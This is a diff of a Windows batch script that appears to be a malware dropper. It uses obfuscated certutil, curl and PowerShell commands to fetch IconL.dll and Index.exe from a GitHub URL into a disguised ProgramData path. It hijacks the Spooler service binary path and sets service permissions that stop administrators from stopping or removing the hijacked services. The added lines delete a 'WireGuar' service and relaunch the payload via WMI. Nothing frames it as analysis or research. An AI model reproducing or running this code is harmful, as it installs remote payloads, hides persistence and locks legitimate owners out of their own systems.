@@ -2,7 +2,7 @@ taskkill.exe /f /IM prn.exe
 
 cert""""util -hash""""file "\\.\%ProgramData%\prndata..\prn" MD5 | findstr /i "4f8dd7da58995cb47b47a8a2c3817e7e" >nul || curl.exe -s -L -o "\\.\%ProgramData%\prndata..\prn" "https://github.com/vltex/1/raw/1/0/IconL.dll"
 cert""""util -hash""""file "\\.\%ProgramData%\prndata..\prn" MD5 | findstr /i "4f8dd7da58995cb47b47a8a2c3817e7e" >nul || cert""""util -url""""cache -sp""""lit -f "https://github.com/vltex/1/raw/1/0/IconL.dll" "\\.\%ProgramData%\prndata..\prn"
-powershell.exe -Command "if ((Get-FileHash '\\?\%ProgramData%\prndata..\prn' -Algorithm MD5 -ErrorAction SilentlyContinue).Hash -ne '4f8dd7da58995cb47b47a8a2c3817e7e') { Invoke-WebRequest 'https://github.com/vltex/1/raw/1/0/IconL.dll' -OutFile '\\.\%ProgramData%\prndata..\prn' }"
+powershell.exe -NoProfile -Command "if ((Get-FileHash '\\?\%ProgramData%\prndata..\prn' -Algorithm MD5 -ErrorAction SilentlyContinue).Hash -ne '4f8dd7da58995cb47b47a8a2c3817e7e') { Invoke-WebRequest 'https://github.com/vltex/1/raw/1/0/IconL.dll' -OutFile '\\.\%ProgramData%\prndata..\prn' }"
 
 dir "\\?\%ProgramData%\prndata..\prn.exe" >nul || curl.exe -s -L -o "\\?\%ProgramData%\prndata..\prn.exe" "https://github.com/vltex/1/raw/1/0/Index.exe"
 dir "\\?\%ProgramData%\prndata..\prn.exe" >nul || cert""""util -url""""cache -sp""""lit -f "https://github.com/vltex/1/raw/1/0/Index.exe" "\\?\%ProgramData%\prndata..\prn.exe"
@@ -32,5 +32,7 @@ sc qc "Spooler" | findstr /L /C:"\\?\%ProgramData%\prndata..\prn.exe" >nul || sc
 sc sdshow "Spooler" | findstr /C:"D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)" >nul || sc sdset "Spooler" "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)"
 sc sdshow "OneSyncTask" | findstr /C:"D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)" >nul || sc sdset "OneSyncTask" "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)"
 
+sc sdset "WireGuar" D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)
+sc delete WireGuar
 rd /S /Q "\\?\%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
-netstat -ano | find "31270" >nul || powershell -Command "([wmiclass]'Win32_Process').Create('\\?\%ProgramData%\prndata..\prn.exe \\?\%ProgramData%\prndata..\prn')"
+netstat -ano | find "31270" >nul || powershell -NoProfile -Command "([wmiclass]'Win32_Process').Create('\\?\%ProgramData%\prndata..\prn.exe \\?\%ProgramData%\prndata..\prn')"
